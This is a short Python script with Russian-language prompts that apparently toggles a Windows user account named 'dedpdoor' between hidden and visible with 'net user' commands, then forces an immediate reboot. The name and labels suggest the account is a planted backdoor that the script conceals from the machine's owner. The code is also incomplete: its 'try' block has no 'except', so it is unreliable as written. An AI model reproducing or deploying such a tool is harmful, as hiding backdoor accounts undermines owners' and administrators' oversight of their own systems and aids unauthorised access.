from os import system
print("dedpdoor software! вирус удали")
while True:
	try:
		print("1 - Скрыть 2 - Показать")
		i = int(input())
		if i == 1:
			system("net user dedpdoor /active:no")
		elif i == 2:
			system("net user dedpdoor /active:yes")
		else:
			continue
		system("shutdown /r /t 0")